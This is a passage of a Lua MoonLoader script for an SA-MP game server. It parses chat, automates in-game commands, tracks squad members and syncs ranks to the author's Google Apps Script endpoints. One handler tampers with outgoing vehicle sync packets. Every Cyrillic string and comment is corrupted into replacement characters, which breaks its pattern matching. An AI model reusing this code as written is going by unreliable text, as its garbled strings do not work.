		os.remove("Moonloader\\run.bat")
	end
end

function ev.onSendVehicleSync(data)
	--print(data)
	if isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) and data.keysData ~= 0 then
		if data.keysData%2 ~= 0 then data.keysData = data.keysData - 1 return end
	end
end

function ev.onGivePlayerMoney(money)
	fond[2] = tostring(money)
end

function ev.onShowTextDraw(id, data)
	if data.text == "kmh" then
		CTaskArr[10][2][1][3] = id + 2
	end

	if data.text:match("FUEL ~w~(%d+)") ~= nil then
		CTaskArr[10][2][1][3] = id
	end

	if id == CTaskArr[10][2][1][3] then
		local f = data.text:match("(%d+)")
		if f ~= nil then
			CTaskArr[10][2][1][1] = f
		end
	end
	--lua: 2066   kmh
	--a: 2068   0

	-- ������� �����
	if config_ini.bools[52] == 1 then
		local n, w, pp, d, k = data.text:match("(.*) %- (.*) ([-+])(%d+)%.%d+(.*)")
		if n ~= nil and data.letterColor == -16777216 then
			local ii = pp == "-" and 1 or 2
			--print(id, data.text)
			if not dinf[ii][1] then dinf[ii][1] = true if ii == 1 then dinf_ini.Settings.dinf1 = 1 end if ii == 2 then dinf_ini.Settings.dinf2 = 1 end inicfg.save(dinf_ini, "dinf") goto dd end

			if dinf[ii][1] then if not dinf[ii][2] then dinf[ii][2] = true return end if dinf[ii][2] then dinf[ii][2] = false goto dd	end end

			::dd::
			local playerId = sampGetPlayerIdByNickname(n)
			if playerId == nil then return end

			local clist = string.sub(string.format('%x', sampGetPlayerColor(playerId)), 3)
			clist = clist == "ffff" and "fffafa" or clist
			local needindex = 0

			for k, v in ipairs(dinf[ii].id) do if v == playerId then needindex = k break end end -- ���� ���� ��� ����� �� ����� �� ���������� ������ � ��� ������������ �������
			if needindex == 0 then for k, v in ipairs(dinf[ii].id) do if v == -1 then needindex = k break end end end -- ���� ���� ������ ������ - ������� ������ ����

			if needindex == 0 then -- ���� �� ������� ���������� ������ ���� ���������� ����� ���� ��
				dinf[ii].id[1] = dinf[ii].id[2] -- �� ������ ������ ��������� ������ �� ������
				dinf[ii].nick[1] = dinf[ii].nick[2]
				dinf[ii].clist[1] = dinf[ii].clist[2]
				dinf[ii].weapon[1] = dinf[ii].weapon[2]
				dinf[ii].damage[1] = dinf[ii].damage[2]
				dinf[ii].kill[1] = dinf[ii].kill[2]

				dinf[ii].id[2] = dinf[ii].id[3] -- �� ������ ������ ������ � �������
				dinf[ii].nick[2] = dinf[ii].nick[3]
				dinf[ii].clist[2] = dinf[ii].clist[3]
				dinf[ii].weapon[2] = dinf[ii].weapon[3]
				dinf[ii].damage[2] = dinf[ii].damage[3]
				dinf[ii].kill[2] = dinf[ii].kill[3]

				dinf[ii].id[3] = -1 -- ������ ������ �������
				dinf[ii].nick[3] = ""
				dinf[ii].clist[3] = ""
				dinf[ii].weapon[3] = ""
				dinf[ii].damage[3] = 0
				dinf[ii].kill[3] = false 
				needindex = 3 -- ������ ����� ���� � ������ ������
			end

			dinf[ii].id[needindex] = playerId -- ���������� ������ � ������
			dinf[ii].nick[needindex] = n
			dinf[ii].clist[needindex] = clist
			dinf[ii].weapon[needindex] = w
			dinf[ii].damage[needindex] = d
			dinf[ii].kill[needindex] = (k ~= nil and k:match("KILL") ~= nil) and true or false

			if dinf[ii].kill[needindex] then print("" .. dinf[ii].id[needindex] .. " - killed") end
		end
	end
		--[[ [ML] (script) 0??? � ?????.lua: 2051   Aleksandr_Hacker - M4 +10.0
		[ML] (script) 0??? � ?????.lua: 2052   Aleksandr_Hacker - M4 +10.0
		[ML] (script) 0??? � ?????.lua: 2051   Aleksandr_Hacker - M4 +4.0 - KILL
		[ML] (script) 0??? � ?????.lua: 2052   Aleksandr_Hacker - M4 +4.0 - KILL

		[ML] (script) 0??? � ?????.lua: 2059   Aleksandr_Hacker - Fist -102.2
		[ML] (script) 0??? � ?????.lua: 2060   Aleksandr_Hacker - Fist -102.2
		[ML] (script) 0??? � ?????.lua: 2059   Aleksandr_Hacker - Fist -104.0 - KILL
		[ML] (script) 0??? � ?????.lua: 2060   Aleksandr_Hacker - Fist -104.0 - KILL ]]
end

function ev.onTextDrawSetString(id, text)
	if id == CTaskArr[10][2][1][3] then 
		local f = text:match("(%d+)")
		if f ~= nil then
			CTaskArr[10][2][1][1] = f
		end
	end
end

function ev.onDisplayGameText(style, time, str)
	if config_ini.bools[59] == 1 and str == "~r~Fuel has ended" and style == 4 and time == 3000 then
		sampSendChat("/fillcar")
	end

	if config_ini.bools[43] == 1 and str == "~g~$500" then
		show.show_500.bool500.v = true
		if (os.time() - show.show_500.time500 <= 5) then
			show.show_500.mult500 = show.show_500.mult500 + 1
			show.show_500.time500 = os.time()
			return false
		else
			show.show_500.mult500 = 1
			show.show_500.time500 = os.time()
			return false
		end
	end
end

function ev.onPlayerQuit(id, reason)
	if config_ini.bools[55] == 1 and sampGetCharHandleBySampPlayerId(id) then
		local reasons = {[0] = '�������/����', [1] = '/q', [2] = '���'}
		sampAddChatMessage("{ff0000}[LUA]: {FFFAFA}����� " .. sampGetPlayerNickname(id) .. "[" .. tostring(id) .. "] ����� � ����. �������: " .. reasons[reason] .. ".", 0xFFFF0000)
	end

	onlinearr[id] = ""
	if sampIs3dTextDefined(2048 - id) then sampDestroy3dText(2048 - id) end
end

function ev.onSendDeathNotification(reason, id)
	if config_ini.bools[53] == 1 and isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then BKTimerTickCount = os.time() end
end

function ev.onPlayerJoin(id, color, isNpc, nickname)
	onlinearr[id] = nickname
	if config_ini.bools[35] == 1 and memb_ini ~= nil then
		local color = 0x00FFFAFA
		sampCreate3dTextEx(2048 - id, memb_ini.players[nickname], color, 0, 0, 0.4, 22, false, id, -1)
	end
end

function ev.onSendCommand(cmd)
	if 1 == 2 then--if config_ini.bools[56] == 1 then
		if sampIsChatCommandDefined(cmd) then return end
		if not isSending then
			local cmds = {["sms"] = 50, ["t"] = 50, ["pm"] = 50}
			local c, id, text
			local c, text = cmd:match("%/(%w+) (.*)")
			if c == nil then return end
			if cmds[string.rlower(c)] ~= nil then id, text = text:match("(%w+) (.*)") end
			local t = strunsplit(text, cmds[string.rlower(c)] ~= nil and cmds[string.rlower(c)] or 80)
			isSending = true
			lua_thread.create(function() for k, v in ipairs(t) do sampSendChat("/" .. c .. " " .. (id == nil and "" or "" .. id .. " ") .. "" .. v .. "") wait(1300) end isSending = false end)
			return false
		end
	end
end

function ev.onSendChat(text)
	if 1 == 2 then --if config_ini.bools[56] == 1 then
		if not isSending then 
			local t = strunsplit(text, 100)
			isSending = true
			lua_thread.create(function() for k, v in ipairs(t) do sampSendChat(v) wait(1300) end isSending = false end)
			return false
		end
	end
end

function ev.onServerMessage(col, text)
		if col == -1347440641 and text:match("��������� ����������%! �����������%: .*") ~= nil then
			lua_thread.create(function()
				if isCharInAnyCar(PLAYER_PED) then
					local car = storeCarCharIsInNoSave(PLAYER_PED)
					local carid = getCarModel(car)
					local motos = {[522] = "NRG-500", [463] = "Freeway", [461] = "PCJ-600", [581] = "BF-400", [521] = "FCR-900", [468] = "Sanchez", [462] = "Faggio"}
					if motos[carid] ~= nil and not isCarPassengerSeatFree(car, 0) then
						local passenger = getCharInCarPassengerSeat(car, 0)
						local result, id = sampGetPlayerIdByCharHandle(passenger)
						if result then sampSendChat("/eject " .. id .. "") end
					end
				end
			end)
		end

		if col == -65281 then
			local nn, nf = text:match('��� ����� ��� %" (%a+)%_(%a+) %"%. ������� ��� � ������� SA%-MP%, � ���� %"Name%"')
			if nn ~= nil then
				lua_thread.create(function()
					sampAddChatMessage("{ff0000}[LUA-Exchange] ��������! {FFFAFA}���������� ����� �������� ����.")
					sampAddChatMessage("{ff0000}[LUA-Exchange] {FFFAFA}������ �������� ���������� ����� � �������. {FF0000}�� �������� �� ����!!!")
					local A_Index = 0
					while true do
						if A_Index == 20 then break end
						local text = sampGetChatString(99 - A_Index)
		
						local onn, of = text:match("%a+%_%a+ �������%(�%) ������ �� ����� ����%: (%a+)%_(%a+) %>%> " .. nn .. "%_" .. nf .. "")
						if onn ~= nil then
							local oldnick = access.saccess and "" .. onn .. "_" .. of .. "" or "" .. onn .. " " .. of .. ""
							local newnick = access.saccess and "" .. nn .. "_" .. nf .. "" or "" .. nn .. " " .. nf .. ""
							local u = access.saccess and "AKfycbwBG17iJ1Jpy5Ft9lmACSIZyrOA7QBydzgM1S12jkARF7ddEWA" or "AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH"
							local responsetext = req("https://script.google.com/macros/s/" .. u .. "/exec?do=sets&key=" .. access.key .. "&state=" .. access.state .. "&newnick=" .. newnick .. "&oldnick=" .. oldnick .. "")
							local re1 = regex.new("@@.@ Update complete @@..@.@") --
							local names = re1:match(responsetext)
							if names == nil then sampAddChatMessage("{FF0000}[LUA-exchane]: {FFFAFA}�� ������� �������� ��� � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}������� ��� � ������� ������.", 0xffff0000) end 
							sampAddChatMessage("{ff0000}[LUA-Exchange] {FFFAFA}����� �������� �� ����.")
							return 
						end
						A_Index = A_Index + 1
					end
				end)
				return false
			end
		end
	
		--- ����������� �������
		if text:match("��� �������������� ������� ������� ������� %'F6%' � ������� %'%/restoreAccess%'") ~= nil then -- ����� ����� � ����
			CTaskArr[10][4] = true
		end

		local s, sk = text:match("�� ������ (.*)%: (%d%d%d)%d%d%d%/%d+")
		if s ~= nil and s ~= "Army LV" then
			table.insert(CTaskArr[1], 7)
			table.insert(CTaskArr[2], os.time())
			table.insert(CTaskArr[3], s)
			CTaskArr[10][3] = sk
		end

		if (text:match("��������� ��������������%. � ��� �������� %d%/5 ���������� %������������%�") or text:match("� ��� ��� ��������� %������������%� ��� �������") ~= nil or text:match("� ������������ �������� ������") ~= nil or text:match("�� ������ �� ������������� ��������%. ��������� � ������") ~= nil) and CTaskArr[10][5] then CTaskArr[10][5] = false end
		---[16:57:04]  ����������: 10000/10000 -- �������� �� ��
		---[16:57:04]  �� ������� ������: 434418/500000

		---[17:02:42]  ����������: 0/10000 -- ��������� �� �������
		---[17:02:42]  �� ������ Army SF: 219080/300000

		---[17:06:06]  ����������: 0/10000 -- ��������� �� ��
		---[17:06:06]  �� ������ Army LV: 366329/500000
		if issquadactive[2] then -- �������� ����� ����� �����
			if col == -1 and text == " �������� ���������" then issquadactive[2] = false end
			if col == -1613968897 then local m = text:match("�� ������� (%d+) ����") if m ~= nil then issquadactive[2] = false issquadactive[3] = tonumber(m) end end
		end

		local date = text:match("�������� ���� ������� �� (.*)") -- ������� �� ��� ����
		if date ~= nil then
			local datetime = {}
			datetime.year, datetime.month, datetime.day = string.match(date,"(%d%d%d%d)%/(%d%d)%/(%d%d)")
			if math.floor((os.difftime(os.time(datetime), os.time())) / 3600 / 24) <= 7 then sampAddChatMessage("{FF0000}[LUA]: ��������!{FFFAFA} �� ����� ���� �������� ������ ������.", 0xffff0000) end
		end

		if col == -356056833  and text:match("������� ������%: .* ����") ~= nil and access.alevel >= 3 and (config_ini.Settings.PlayerRank == "�����" or config_ini.Settings.PlayerRank == "������������" or config_ini.Settings.PlayerRank == "���������" or config_ini.Settings.PlayerRank == "�������") then
			lua_thread.create(function()
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}����� 10 ������ �������� �������� ���������� ������� � ������� ������.", 0xffff0000)
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� N - ��� ������ ��������.", 0xffff0000)
				local a = os.time()
				while (os.time() - a < 10) do wait(0) if isKeyDown(vkeys.VK_N) then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ��������", 0xffff0000) return end end

				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� ���� ����������...", 0xFFFF0000)
				local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=getlist")
				local str = responsetext:match("%@%@%.%@ (.*) %@%@%.%.%@%.%@")
				local rukstr = str:match("(.*) @@....@") -- ���-��
				if rukstr ~= nil then for k, v in ipairs(rukstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
						
				local osnstr = str:match("@@....@ (.*) @@...@") -- �������� ������
				if osnstr ~= nil then for k, v in ipairs(osnstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
							
				local stjstr = str:match("@@...@ (.*)") -- �������
				if stjstr ~= nil then for k, v in ipairs(stjstr:split("; ")) do local a = v:split(" ") soptlist[1][a[1]  .. "_" .. a[2]] = 0 end end
				
				
				otmmode = true 
				sampSendChat("/offmfilter clear") wait(500) sampSendChat("/offmembers")				
				while otmmode do wait(0) end

				local names = ""
				local otms = ""
				for k, v in pairs(soptlist[1]) do 
					local f, s = k:match("(.*)%_(.*)") 
					names = names == "" and "" .. f .. "%20" .. s .. "" or "" .. names .. "@.@" .. f .. "%20" .. s .. ""
					otms = otms == "" and v or "" .. otms .. "@.@" .. v .. ""
				end
				sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}���� ���������� ��������. ������� ��������� ������ � �������...", 0xFFFF0000)
				
				local responsetext = req("https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=otm&names=" .. names .. "&otms=" .. otms .. "&" .. moderpas .. "")
				local re1 = regex.new("@@.@ Update complete @@..@.@") --
				local names = re1:match(responsetext)
				if names == nil then sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�� ������� �������� ������� � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}������� � ������� ������ ������� ���������.", 0xffff0000) end 
				return 
			end)
		end

		if not show.othervars.saccess then
			local rank = tonumber(text:match(" %a+%_%a+ �������%/������� ��c �� (%d+) �����")) -- �������������� ��������� ���� � �������
			if rank ~= nil then
				lua_thread.create(function()
					local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
					local mynick = sampGetPlayerNickname(myid)
					local arr = {[1] = "�������", [2] = "��������", [3] = "��. �������", [4] = "�������", [5] = "��. �������", [6] = "��������", [7] = "���������", [8] = "��. ���������", [9] = "���������", [10] = "��. ���������", [11] = "�������", [12] = "�����", [13] = "������������", [14] = "���������"}
					local f, s = mynick:match("(.*)%_(.*)")
					local nick = "" .. f .. " " .. s .. ""
					if arr[rank] == nil then sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}�� ������� �������� ������ � ������� ������.", 0xffff0000) return end
					local r = translit(arr[rank])
					--https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=uprank&nick=Vladislav Reddle&rank=[[M]][[a]][[y`]][[o]][[r]]

					local url = 'https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=uprank&nick=' .. nick .. '&rank=' .. r .. ''
					local responsetext = req(url)
					local re1 = regex.new("@@.@ Update complete @@..@.@") --
					local names = re1:match(responsetext)
					if names == nil then sampAddChatMessage("{FF0000}[LUA-exchane]: {FFFAFA}�� ������� �������� ������ � ������� ������.", 0xffff0000) else sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}������� ������ � ������� ������.", 0xffff0000) end 
					return 
				end)
			end

			local re1 = regex.new('([A-Za-z]+\\_[A-Za-z]+) ��������? ������� ����\\-������� ����� \\"�\\.�\\.�\\.�\\.\\" ����� ([A-Za-z]+) ([A-Za-z]+)') -- �������������� ��������� ������� � �������
			local f, s1, s2 = re1:match(text)
			if s1 ~= nil then
				lua_thread.create(function()
					local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
					local nick = sampGetPlayerNickname(myid)
					if nick == "" .. s1 .. "_" .. s2 .. "" and indexof(f, stroyarr.soptlist.ruk) then
						sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}�������� ������ ��������� ������...", 0xffff0000)
						local responsetext = req('https://script.google.com/macros/s/AKfycbwURDW5ngl2NOV52zplnjpmKKnhs8pBMUp0A_HZnnYbRXYA4yrH/exec?do=auth&nick=' .. s1 .. '%20' .. s2 .. '') -- ����� ������� ����
						local re0 = regex.new("\\@\\@\\.\\@ (.*) \\@\\@\\.\\.\\@\\.\\@") --
						local access
						access = tonumber(re0:match(responsetext))
						if access == nil then sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}����������� ������ ��� ���������� �������.", 0xffff0000) return end

						config_ini.UserClist[12] = access == 0 and "���������� ����� \"�.�.�.�.\"" or access ~= 6 and "������� �����-������� ����� \"�.�.�.�.\"" or "������� �����-������� ����� ��������� ����� \"�.�.�.�.\""
						PlayerU = access == 0 and "������ �.�.�.�." or access == 1 and "������ �.�.�.�." or access == 2 and "����������� ��������� �.�.�.�." or access == 3 and "�������� �.�.�.�." or access == 4 and "������� �.�.�.�." or access == 5 and "���� �.�.�.�." or (lvl == 1 and "������ �.�.�.�." or lvl == 2 and "����������� ��������� �.�.�.�." or lvl == 3 and "�������� �.�.�.�." or lvl == 4 and "������� �.�.�.�." or "���� �.�.�.�")
						tag = "|| �.�.�.�. ||"
						useclist = "12"
						sampAddChatMessage("{FF0000}[LUA-exchange]: {FFFAFA}������ ��������� ������ ������� ��������.", 0xffff0000)
					end
				end)
			end
		end
		
		if config_ini.bools[48] == 1 then
			local m = text:match("����������: (%d+)/10000")
			if m ~= nil then skipd[3][4] = tonumber(m) return end

			if skipd[3][5] then -- /mon
				local re0 = regex.new("(����|����|����|���|����� ��) ([0-9]+)/[0-9]+") --
				local fr, sk = re0:match(text)
				if fr ~= nil then
					local tarr = {["����"] = "LSPD", ["����"] = "LVPD", ["����"] = "SFPD", ["���"] = "FBI", ["����� ��"] = "SFA",}
					skipd[3][6][tarr[fr]] = math.floor(tonumber(sk)/1000)
					if tarr[fr] ~= "SFA" then return false end
					--���� - 102 | ���� - 110 | ���� - 112 | ��� - 130 | ��� - 235
					lua_thread.create(function() wait(600) sampSendChat("/f " .. tag .. " ���� - " .. skipd[3][6].LSPD .. " | ���� - " .. skipd[3][6].SFPD .. " | ���� - " .. skipd[3][6].LVPD .. " | ��� - " .. skipd[3][6].FBI .. " | ��� - " .. skipd[3][6].SFA .. "") end)
					skipd[3][5] = false
					return false
				end
			end
		end

		if config_ini.bools[50] == 1 then -- ����� ������ ����� � �����
			if text:match("������� �� ��������") or text:match("� ��� ������������ �����%!") then skipd[3][2] = 3 return end
		--	if text == " � ��� ��� �������� ����������" then skipd[3][2] = 1 return end
			if text == " � ��� ��� �����" and skipd[3][2] == 0 then skipd[3][2] = 1 return end
			if text == " � ��� ��� �����" and skipd[3][2] == 1 then skipd[3][2] = 2 return end
			if text:match(" ��� �����%(�%) ������������ (.*)%. �� ������������ ������") or text:match("��������� ��������������%. � ��� �������� %d%/%d+ ���������� %������������%�") and skipd[3][2] == 2 then skipd[3][2] = 0 end
		end

		if config_ini.bools[51] == 1 then -- ��������� ���������
			if text:match("������� .* ����� ��������������� ��� ���������� �� %d+ ����.*") then sampSendChat("/ac repair") return end
			local cost = tonumber(text:match("������� .* ����� ��������� ��� ���������� �� (%d+) ����.*"))
			if cost ~= nil then
				local ncost = tonumber(config_ini.dial[3])
				if ncost ~= nil and cost <= ncost then lua_thread.create(function() wait(600) sampSendChat("/ac refill") end) return end
			end
		end

		local regexes = {}
		local localvars = {}
		if config_ini.bools[41] == 1 then -- �����
			local offid = text:match("%[����������%] %a+_%a+%[(%d+)%] %{D95A41%}����������")
			local fname, sname, onid = text:match("%[����������%] (%a+)_(%a+)%[(%d+)%] (.*) %{00AB06%}�����������")
			local connect = text:match("�� ������������ � ����������")
			local uninv = text:match("%[����������%] %a+%_%a+%[%d+%] %{C42100%}������%{9FCCC9%} (.*) �� ����������")
			local unme = text:match("%a+%_%a+% ������ ��� �� ���������� %'.*%'")
			local disconnect = text:match("�� ����������� �� ����������")
			local fsfn, fssn, racid, sq = text:match("%[�����%] (%a+)_(%a+)%[(%d+)%] .*: (.*)")
			if unme ~= nil or disconnect ~= nil then rCache = {enable = false, squaddata = {}, smem = {}} return end
			
			if connect ~= nil then lua_thread.create(function() findsquad() end) end
			
			if uninv ~= nil then
				lua_thread.create(function()
					local id = -1
					for k, v in pairs(rCache.smem) do if v.name == uninv then id = k break end end
					if id ~= -1 then rCache.smem[tonumber(id)] = nil end
				end)
			end
			
			if offid ~= nil then 
				rCache.smem[tonumber(offid)] = nil
			end
		
			if onid ~= nil then
				id = tonumber(onid)
				local color = sampGetPlayerColor(id)
           		local a, r, g, b = explode_argb(color)
				--[[ clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
				clist = clist == "ffff" and "fffafa" or clist ]]
						
				rCache.smem[id] = {["name"] = "" .. fname .. "_" .. sname .. "", ["color"] = join_argb(230.0, r, g, b), ["colorns"] = join_argb(150.0, r, g, b), ["time"] = 0}
			end
			
			if sq ~= nil then 
				local rrid = tonumber(racid)

				if rCache.smem[rrid] == nil then 
					local color = sampGetPlayerColor(id)
					local a, r, g, b = explode_argb(color)
					--[[ local clist = string.sub(string.format('%x', sampGetPlayerColor(rrid)), 3)
					local clist = clist == "ffff" and "fffafa" or clist	 ]]	
					rCache.smem[rrid] = {["name"] = "" .. fsfn .. "_" .. fssn .. "", ["color"] = join_argb(230.0, r, g, b), ["colorns"] = join_argb(150.0, r, g, b), ["time"] = 0}
				end

				local col = "0x" .. config_ini.squadset[1] .. "FF" 
				local off1 = sq:match("sq%_message%_id%_1%_(%d+)") -- �����/���� � ��
				local off2 = sq:match("sq%_message%_id%_2") 
				--local off3ID, off3Act = sq:match("sq%_message%_id%_3%_(%d+)%| (.*)")
				if off1 ~= nil then	rCache.smem[rrid].time = tonumber(off1) + (3600 * tonumber(config_ini.Settings.timep)) return false end

				if off2 ~= nil then rCache.smem[tonumber(racid)].time = 0 return false end

				if off3ID ~= nil and tostring(select(2, sampGetPlayerIdByCharHandle(PLAYER_PED))) == off3ID then lua_thread.create(function() wait(300) sampAddChatMessage("{FF0000}[LUA]: {FFFAFA}�������� ������� �� " .. fsfn .. "_" .. fssn .. "[" .. racid .. "] - ������� ����������...") sampSendChat(off3Act) end) return false end
					return {col, text} 
			end
		end
			
		local re0 = regex.new("(�������|��������|��.�������|�������|��.�������|��������|���������|��.���������|���������|��.���������|�������|�����|������������|���������|�������)  (.*)\\_(.*)\\[([0-9]+)\\]\\: (.*)") --
		local z, fn, sn, id, txt = re0:match(text)
		if txt ~= nil and col == -1920073729 then
			if config_ini.bools[35] == 1 then
				if memb_ini.players["" .. fn .. "_" .. sn .. ""] ~= z then
					sampDestroy3dText(2048 - tonumber(id))
					memb_ini.players["" .. fn .. "_" .. sn .. ""] = z
					sampCreate3dTextEx(2048 - tonumber(id), memb_ini.players["" .. fn .. "_" .. sn .. ""], 0xffFFFAFA, 0, 0, 0.4, 22, false, tonumber(id), -1)
					lua_thread.create(function() inicfg.save(memb_ini, "members") end)
				end
			end

			if not stroyarr.stroycreator then
				local re1 = regex.new("�.�.�.�., ���������� � ��������!") -- ����� ����
				if re1:match(txt) then stroyarr.stroymode, stroyarr.stroystate, stroyarr.creator.id, stroyarr.creator.zv = true, 0, tonumber(id), indexof(z, ranksnames) end
			end
				
			if not stroyarr.stroymode then
				local re1 = regex.new("([�-��-�]�������� �����������[�-��-�]|[S|s|C|c|�|�][O|o|�|�][S|s|C|c|�|�]|[�-��-�]���(���[�-��-�]|�[�-��-�]?)) .*([A-Z�-��-�a-z][\\s, \\-][0-9]+)(\\s?)") -- ����� ����
				local _, _, kv = re1:match(txt)
				if kv ~= nil then
					table.insert(CTaskArr[1], 1)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], kv)
				end

				local re2 = regex.new("[�|�]�������[�-��-�].*([A-Z�-��-�a-z]+\\s?-?[0-9]+)(\\s?)") -- ����� ���������
				local _1, _2, _3, kv = re2:match(txt)
				if kv ~= nil then
					table.insert(CTaskArr[1], 2)
					table.insert(CTaskArr[2], os.time())
					table.insert(CTaskArr[3], kv)
				end

				
				if txt:match("�������� ���") ~= nil and isCharInArea2d(PLAYER_PED, -84, 1606, 464, 2148, false) then
					local idc = isCharInAnyCar(PLAYER_PED) and getCarModel(storeCarCharIsInNoSave(PLAYER_PED)) or -1
					if idc ~= 433 then
						lua_thread.create(function() 
							local A_Index = 0
							while true do
								if A_Index == 20 then break end
								local text = sampGetChatString(99 - A_Index)
				
								local re1 = regex.new("[�-��-�]+(���|���|������|��)[�-��-�].*((([�-��-�]�����[�-��-�]|(P|p|�|�)olise)\\s?)?((�|�|L|l|C|c|�|�)(C|c|�|�|S|s|�|�|V|v)|(C|c|�|�|s|S)(�|�|F|f))|(F|f|�|�)(B|b|�|�|�|�)(I|i|�|�|�|�)|(S|s|�|�|C|c)(A|a|�|�)(N|n|�|�|H|h)[\\s,\\-,\\_]?(F|f|�|�)(i|I|�|�)(�|�|E|e)(P|p|�|�|r|R)(P|p|�|�|r|R)?(O|o|�|�)|(L|l|�|�)(o|O|�|�)(�|�|C|c|S|s)[\\s,\\-,\\_]?(�|�|C|c|S|s)(A|a|�|�)(N|n|�|�)(t|T|�|�)(O|o|�|�)(�|�|C|c|S|s)|(L|l|�|�)(A|a|�|�)(S|s|�|�|C|c)[\\s,\\-,\\_]?(V|v|�|�|b|B)(�|�|E|e)(N|n|�|�)(t|T|�|�)(U|u|�|�|Y|y)(P|p|�|�|r|R)(A|a|�|�)(S|s|�|�|C|c))")
								local _, p = re1:match(text)
								if p ~= nil then
									local reLS = regex.new("(((([�-��-�]�����[�-��-�]|(P|p|�|�)olise)\\s?)?((�|�|L|l)(C|c|�|�|S|s)))|(L|l|�|�)(o|O|�|�)(�|�|C|c|S|s)[\\s,\\-,\\_]?(�|�|C|c|S|s)(A|a|�|�)(N|n|�|�)(t|T|�|�)(O|o|�|�)(�|�|C|c|S|s))")
									local reSF = regex.new("(((([�-��-�]�����[�-��-�]|(P|p|�|�)olise)\\s?)?((C|c|�|�|s|S)(�|�|F|f)))|(F|f|�|�)(B|b|�|�|�|�)(I|i|�|�|�|�)|(S|s|�|�|C|c)(A|a|�|�)(N|n|�|�|H|h)[\\s,\\-,\\_]?(F|f|�|�)(i|I|�|�)(�|�|E|e)(P|p|�|�|r|R)(P|p|�|�|r|R)?(O|o|�|�))")
									local reLV = regex.new("(((([�-��-�]�����[�-��-�]|(P|p|�|�)olise)\\s?)?((�|�|L|l)(�|�|V|v)))|(L|l|�|�)(A|a|�|�)(S|s|�|�|C|c)[\\s,\\-,\\_]?(V|v|�|�|b|B)(�|�|E|e)(N|n|�|�)(t|T|�|�)(U|u|�|�|Y|y)(P|p|�|�|r|R)(A|a|�|�)(S|s|�|�|C|c))")
									local pp = reLS:match(p) ~= nil and "�� �. Los-Santos" or reSF:match(p) ~= nil and "�� �. San-Fierro" or reLV:match(p) ~= nil and "�� �. Las-Venturas" or ""
									table.insert(CTaskArr[1], 4)
									table.insert(CTaskArr[2], os.time())
									table.insert(CTaskArr[3], pp)
									return 
								end
								A_Index = A_Index + 1
							end
						end)
					end
				end
			else
				local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
				local mynick = sampGetPlayerNickname(myid)
				local nick = fn .. "_" .. sn
				if ((not stroyarr.stroycreator and id ~= stroyarr.creator.id) or (stroyarr.stroycreator)) and (mynick ~= nick) then
					local re4 = regex.new("\\|\\| �\\.�\\.�\\.�\\. \\|\\| �������\\!")
					local res = re4:match(txt)
					if res ~= nil and stroyarr.stroystate < 2 then
						local z_index = indexof(z, ranksnames)
						local id = tonumber(id)
						local tempbool = false
						if indexof(nick, stroyarr.soptlist.ruk) ~= false then tempbool = true insertruk(id, z_index) end
						if indexof(nick, stroyarr.soptlist.osn) ~= false then tempbool = true insertosn(id, z_index) end
						if indexof(nick, stroyarr.soptlist.stj) ~= false then tempbool = true insertstj(id, z_index) end
											
						if tempbool then
							if stroyarr.stroyleader.current == "" or stroyarr.stroyleader.current ~= stroyarr.stroypr.ids[1] then 
								local temp = stroyarr.stroyleader.current ~= "" and stroyarr.stroyleader.current or ""
								local result, myid = sampGetPlayerIdByCharHandle(PLAYER_PED)
								if temp ~= "" then sampAddChatMessage("{FF0000}[LUA]: {fffafa}����� �������� � ����� ���� ������ ������ �������.", 0x00FFFAFA) end
													
								stroyarr.stroyleader.current = stroyarr.stroypr.ids[1]
								if stroyarr.stroyleader.current == myid then 
									sampAddChatMessage("{FF0000}[LUA]: {fffafa}�� ���� ��������� ������� �� ����������.", 0x00FFFAFA)
									stroyarr.stroystate = 1
								else
									sampAddChatMessage("{FF0000}[LUA]: {fffafa}����� " .. sampGetPlayerNickname(stroyarr.stroypr.ids[1]) .. " [" .. tostring(stroyarr.stroypr.ids[1]) .. "] ��� �������� ������� �� ����������.", 0x00FFFAFA)
								end
							end
						end
					end
				end
			end

			if config_ini.bools[40] == 1 then -- ������� �� ���������� ���� � �����
				local re3 = regex.new("(" .. config_ini.warnings[1] .. "|" .. config_ini.warnings[2] .. "|" .. config_ini.warnings[3] .. "|" .. config_ini.warnings[4] .. ")")
				local res = re3:match(txt)
				if res ~= nil then sampAddChatMessage("{FF0000}[LUA]: ��������! {FFFAFA}" .. z .. " " .. fn .. "_" .. sn .. "[" .. id .. "] �������� ���� � �����!", 0xFFFF0000) end
			end

			if config_ini.bools[39] == 1 then -- ��������� ���� � ����� (������ ���� ����� ���������)
				local clist = string.sub(string.format('%x', sampGetPlayerColor(id)), 3)
				clist = clist == "ffff" and "fffafa" or clist
